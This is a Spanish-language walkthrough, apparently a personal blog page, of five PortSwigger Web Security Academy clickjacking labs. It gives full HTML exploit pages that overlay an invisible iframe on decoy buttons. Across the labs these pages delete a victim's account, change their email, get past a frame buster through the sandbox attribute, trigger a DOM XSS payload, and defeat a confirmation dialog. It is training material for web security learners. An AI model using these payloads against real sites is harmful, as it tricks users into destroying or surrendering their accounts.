---
layout: default
title: "Clickjacking - PortSwigger"
permalink: /clickjacking-ps/
---

# Clickjacking - PortSwigger

Todos los laboratorios posteriormente expuestos los puedes encontrar para resolverlos en el siguiente link.

[https://portswigger.net/web-security/clickjacking](https://portswigger.net/web-security/clickjacking)

## Índice


## 1. Lab: Basic clickjacking with CSRF token protection

```
Este laboratorio contiene la funcionalidad de inicio de sesión y un botón de eliminación de cuenta que está protegido por un token CSRF . Un usuario hará clic en los elementos que muestran la palabra "click" en un sitio web de señuelo.

Para resolver el laboratorio, cree algo de HTML que enmarque la página de la cuenta y engañe al usuario para que elimine su cuenta. El laboratorio se resuelve cuando se elimina la cuenta.

Puede iniciar sesión en su propia cuenta con las siguientes credenciales:

wiener:peter
```

El laboratorio nos otorga un código en html para realizar clickjacking y lo que haremos sera editarlo hasta llegar a la solución.

```html
<head>
	<style>
		#target_website {
			position:relative;
			width:128px;
			height:128px;
			opacity:0.00001;
			z-index:2;
			}
		#decoy_website {
			position:absolute;
			width:300px;
			height:400px;
			z-index:1;
			}
	</style>
</head>
...
<body>
	<div id="decoy_website">
	...decoy web content here...
	</div>
	<iframe id="target_website" src="https://vulnerable-website.com">
	</iframe>
</body>
```

Entonces, accedemos al exploit server para configurar nuestro payload.

![](img1.png)

Entonces, editamos el código html anterior para realizar un iframe de la pagina objetivo.

```html
<html>
	<head>
		<style>
			#target{
				position:relative;
				width:1280px;
				height:600px;
				opacity:0.5;
				z-index:2;
			}

			#decoy_website{
				position:absolute;
				width:1280px;
				height:600px;
				z-index:1;
			}
		</style>
	</head>
	<body>
		<div id="decoy_website">
		texto de prueba
		</div>

		<iframe id='target' src='https://0a1900c403c8ce398779ae83009a00b5.web-security-academy.net/my-account' >
	</body>
</html>
```
Como podemos ver cambiamos el valor de la opacidad a 0.5 para poder ver el iframe de la pagina objetivo y nuestra web. Luego hacemos clic en **View Exploit**.

![](img2.png)

Como podemos ver, nos encontramos con un iframe, que contiene el sitio web objetivo donde debemos engañar al usuario para que elimine su cuenta. Gracias a que iniciamos sesión anteriormente en el sitio web, el iframe funciona como una mini ventana de navegador cargando el panel del usuario con las cookies de sesión.

Ahora, intentaremos centrar el texto de prueba en la misma posición del botón **Delete account**. Para ello podemos usar el css o html simple, en este caso usaremos html simple siendo **\<br>** como salto de linea y **&nbsp** como desplazamiento a la derecha.

```html
<html>
	<head>
		<style>
			#target{
				position:relative;
				width:1280px;
				height:600px;
				opacity:0.5;
				z-index:2;
			}

			#decoy_website{
				position:absolute;
				width:1280px;
				height:600px;
				z-index:1;
			}
		</style>
	</head>
	<body>
		<div id="decoy_website">
		<br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp texto de prueba
		</div>

		<iframe id='target' src='https://0a1900c403c8ce398779ae83009a00b5.web-security-academy.net/my-account' >
	</body>
</html>
```

Obteniendo el siguiente resultado:

![](img3.png)

Como podemos ver, tenemos el texto de prueba situado en el lugar del botón **Delete account**, entonces reemplazaremos este texto por un botón que diga **click** como nos solicita el laboratorio.

```html
<html>
	<head>
		<style>
			#target{
				position:relative;
				width:1280px;
				height:600px;
				opacity:0.5;
				z-index:2;
			}

			#decoy_website{
				position:absolute;
				width:1280px;
				height:600px;
				z-index:1;
			}
		</style>
	</head>
	<body>
		<div id="decoy_website">
		<br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp<button class="button" type="submit">click</button>
		</div>

		<iframe id='target' src='https://0a1900c403c8ce398779ae83009a00b5.web-security-academy.net/my-account' >
	</body>
</html>
```

Obteniendo el siguiente resultado:

![](img4.png)

Ahora, volveremos a asignar el valor de **opacity** en **0.000001**.

```html
<html>
	<head>
		<style>
			#target{
				position:relative;
				width:1280px;
				height:600px;
				opacity:0.000001;
				z-index:2;
			}

			#decoy_website{
				position:absolute;
				width:1280px;
				height:600px;
				z-index:1;
			}
		</style>
	</head>
	<body>
		<div id="decoy_website">
		<br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp<button class="button" type="submit">click</button>
		</div>

		<iframe id='target' src='https://0a1900c403c8ce398779ae83009a00b5.web-security-academy.net/my-account' >
	</body>
</html>
```

Obteniendo el siguiente resultado:

![](img5.png)

Ahora que tenemos el código html completo, se lo enviamos a la victima para resolver el laboratorio.

```html
<html>
	<head>
		<style>
			#target{
				position:relative;
				width:1280px;
				height:600px;
				opacity:1;
				opacity:0.000001;
				z-index:2;
			}

			#decoy_website{
				position:absolute;
				width:1280px;
				height:600px;
				z-index:1;
			}
		</style>
	</head>
	<body>
		<div id="decoy_website">
		<br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp<button class="button" type="submit">click</button>
		</div>

		<iframe id='target' src='https://0a37001a04cfe2cfc118c7fd0090008c.web-security-academy.net/my-account' >
	</body>
</html>
```
![](img6.png)

Como podemos ver, luego de enviar el exploit a la victima, el laboratorio cambia a resuelto.

## 2. Lab: Clickjacking with form input data prefilled from a URL parameter

```
Este laboratorio amplía el ejemplo básico de clickjacking en Lab: Clickjacking básico con protección de token CSRF . El objetivo del laboratorio es cambiar la dirección de correo electrónico del usuario rellenando previamente un formulario con un parámetro de URL e incitando al usuario a hacer clic sin darse cuenta en el botón "Update email".

Para resolver el laboratorio, cree algo de HTML que enmarque la página de la cuenta y engañe al usuario para que actualice su dirección de correo electrónico haciendo clic en un señuelo "Click me". El laboratorio se resuelve cuando se cambia la dirección de correo electrónico.

Puede iniciar sesión en su propia cuenta con las siguientes credenciales:wiener:peter
```

```html
<html>
	<head>
		<style>
			#target{
				position:relative;
				width:1280px;
				height:600px;
				opacity:1;
				opacity:0.00001;
				z-index:2;
			}

			#decoy_website{
				position:absolute;
				width:1280px;
				height:600px;
				z-index:1;
			}
		</style>
	</head>
	<body>
		<div id="decoy_website">
		<br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp<button class="button" type="submit">Click me</button>
		</div>

		<iframe id='target' src='https://0a6000b703aee9b2c361b043006900c3.web-security-academy.net/my-account?email=email@feik.com' >
	</body>
</html>
```





## 3. Lab: Clickjacking with a frame buster script

```
Este lab está protegido por un destructor de marcos que evita que el sitio web sea enmarcado. ¿Puede sortear el destructor de marcos y realizar un ataque de secuestro de clics que cambie la dirección de correo electrónico de los usuarios?

Para resolver el laboratorio, cree algo de HTML que enmarque la página de la cuenta y engañe al usuario para que cambie su dirección de correo electrónico haciendo clic en "Click me". El laboratorio se resuelve cuando se cambia la dirección de correo electrónico.

Puede iniciar sesión en su propia cuenta con las siguientes credenciales:wiener:peter
```

```html
<html>
	<head>
		<style>
			#target{
				position:relative;
				width:1280px;
				height:600px;
				opacity:1;
				opacity:0.0001;
				z-index:2;
			}

			#decoy_website{
				position:absolute;
				width:1280px;
				height:600px;
				z-index:1;
			}
		</style>
	</head>
	<body>
		<div id="decoy_website">
		<br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp<button class="button" type="submit">Click me</button>
		</div>

		<iframe id='target' src='https://0afa00f2047be961c0b26dac00b300a2.web-security-academy.net/my-account?email=admin@xnxx.com' sandbox='allow-forms'>
	</body>
</html>
```


## 4. Lab: Exploiting clickjacking vulnerability to trigger DOM-based XSS

```
Este laboratorio contiene una vulnerabilidad XSS que se activa con un clic. Cree un ataque de secuestro de clics que engañe al usuario para que haga clic en el botón "Click me" para llamar a la print()función.
```

```html
<html>
	<head>
		<style>
			#target{
				position:relative;
				width:1280px;
				height:1280px;
				opacity:1;
				opacity:0.5;
				z-index:2;
			}

			#decoy_website{
				position:absolute;
				width:1280px;
				height:600px;
				z-index:1;
			}
		</style>
	</head>
	<body>
		<div id="decoy_website">
		<br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp<button class="button" type="submit">Click me</button>
		</div>

		<iframe id='target' src='https://0a8f0023039ecf0dc05009b6006e00e0.web-security-academy.net/feedback?name=%3Cimg%20src=x%20onerror=%27print()%27%3E&email=a@a.com&subject=a&message=mensaje' sandbox='allow-modals allow-forms allow-popups allow-same-origin allow-scripts'>
	</body>
</html>
```


## 5. Lab: Multistep clickjacking

```
Este laboratorio tiene algunas funciones de cuenta que están protegidas por un token CSRF y también tiene un cuadro de diálogo de confirmación para proteger contra el secuestro de clics . Para resolver este laboratorio, construya un ataque que engañe al usuario para que haga clic en el botón Eliminar cuenta y en el cuadro de diálogo de confirmación haciendo clic en las acciones de señuelo "Click me first" y "Click me next". Necesitará usar dos elementos para este laboratorio.

Puede iniciar sesión en la cuenta usted mismo utilizando las siguientes credenciales:wiener:peter
```

```html
<html>
	<head>
		<style>
			#target{
				position:relative;
				width:1280px;
				height:1280px;
				opacity:1;
				opacity:0.5;
				z-index:2;
			}

			#decoy_website{
				position:absolute;
				width:1280px;
				height:600px;
				z-index:1;
			}

			#decoy_website2{
				position:absolute;
				width:1280px;
				height:600px;
				z-index:1;
			}
		</style>
	</head>
	<body>
		<div id="decoy_website">
		<br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp<button class="button" type="submit">Click me first</button>
		</div>

		<div id="decoy_website2">
		<br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp<button class="button" type="submit">Click me next</button>
		</div>

		<iframe id='target' src='https://0acb0090038c45edc32965ff009500d7.web-security-academy.net/my-account' sandbox='allow-modals allow-forms allow-popups allow-same-origin allow-scripts'>
	</body>
</html>
```